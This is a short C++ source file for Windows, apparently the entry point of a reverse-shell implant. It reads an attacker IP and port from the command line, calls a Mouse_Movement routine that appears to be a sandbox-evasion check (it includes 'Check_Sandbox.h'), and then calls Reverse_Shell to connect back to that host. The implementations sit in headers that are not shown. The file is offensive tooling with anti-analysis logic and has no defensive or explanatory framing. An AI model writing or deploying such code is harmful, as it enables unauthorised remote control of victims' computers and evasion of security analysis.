#include <windows.h>
#include <iostream>
#include "Reverse_Shell.h"
#include "Check_Sandbox.h"
#include <typeinfo>
#include <string>
#include <sstream>

using namespace std;

int main(int argc , char **argv)
{  

	const char* IP_Address;
	string str_obj(argv[1]);
	IP_Address = &str_obj[0];
	int Port = atoi(argv[2]);

   Mouse_Movement();
   Reverse_Shell(IP_Address , Port);

}